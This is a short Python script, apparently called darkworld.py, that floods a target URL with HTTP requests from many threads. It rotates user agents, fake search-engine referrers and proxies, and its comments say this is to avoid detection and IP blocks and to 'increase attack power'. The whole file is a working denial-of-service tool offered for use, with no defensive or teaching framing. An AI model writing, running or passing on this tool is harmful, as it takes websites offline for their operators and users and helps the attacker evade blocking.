import requests
import threading
import random
import sys
import time

# User-agent pool to randomize requests
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/60.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/17.17134',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
]

# Referrer pool to avoid detection
REFERERS = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://duckduckgo.com/',
    'https://www.yahoo.com/',
    'https://www.yandex.com/'
]

# Proxies to increase attack power and avoid IP blocks (optional)
PROXIES = [
    'http://12.345.678.90:8080',
    'http://98.76.54.32:8080',
    # Add more proxies as needed
]

# Custom headers to mimic legitimate traffic
def get_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Referer': random.choice(REFERERS),
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    }

# Function to send a bulk of requests
def send_request(target_url):
    while True:
        try:
            proxy = {'http': random.choice(PROXIES)} if PROXIES else None
            headers = get_headers()
            response = requests.get(target_url, headers=headers, proxies=proxy, timeout=5)
            print(f"Response: {response.status_code} from {target_url}")
        except requests.exceptions.RequestException:
            pass  # Ignore exceptions (timeouts, connection errors)

# Start the attack with multiple threads
def start_attack(target_url, thread_count):
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_request, args=(target_url,))
        threads.append(thread)
        thread.start()
        time.sleep(0.001)  # Short delay between thread starts to stabilize CPU usage

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 darkworld.py <URL> <Number of Threads>")
        sys.exit(1)

    target_url = sys.argv[1]
    thread_count = int(sys.argv[2])

    print(f"Starting attack on {target_url} with {thread_count} threads per second.")
    start_attack(target_url, thread_count)